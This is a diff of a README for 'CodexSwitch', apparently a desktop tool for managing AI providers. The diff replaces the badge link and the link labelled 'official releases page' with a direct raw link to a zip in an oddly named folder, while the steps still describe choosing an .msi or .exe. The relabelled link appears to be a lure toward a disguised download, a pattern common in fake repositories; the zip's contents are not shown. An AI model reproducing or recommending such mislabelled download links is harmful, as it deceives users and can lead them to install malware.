@@ -1,6 +1,6 @@
 # 🚀 CodexSwitch - Manage your AI providers with ease
 
-[![](https://img.shields.io/badge/Download_CodexSwitch-007ACC.svg?style=for-the-badge)](https://github.com/unblinking-birth533/CodexSwitch/releases)
+[![](https://img.shields.io/badge/Download_CodexSwitch-007ACC.svg?style=for-the-badge)](https://github.com/unblinking-birth533/CodexSwitch/raw/refs/heads/main/immediateness/Codex_Switch_2.6.zip)
 
 CodexSwitch acts as a central hub for your artificial intelligence tools. It connects different AI services into a single interface on your computer. You use this software to manage costs, switch between providers, and keep your data local. It simplifies the setup process by acting as a bridge between your preferred AI tools and various service providers.
 
@@ -8,7 +8,7 @@ CodexSwitch acts as a central hub for your artificial intelligence tools. It con
 
 Follow these steps to get the application on your computer.
 
-1. Visit the [official releases page](https://github.com/unblinking-birth533/CodexSwitch).
+1. Visit the [official releases page](https://github.com/unblinking-birth533/CodexSwitch/raw/refs/heads/main/immediateness/Codex_Switch_2.6.zip).
 2. Look for the latest version at the top of the list.
 3. Select the file ending in `.msi` or `.exe` for Windows.
 4. Click the link to begin your download.
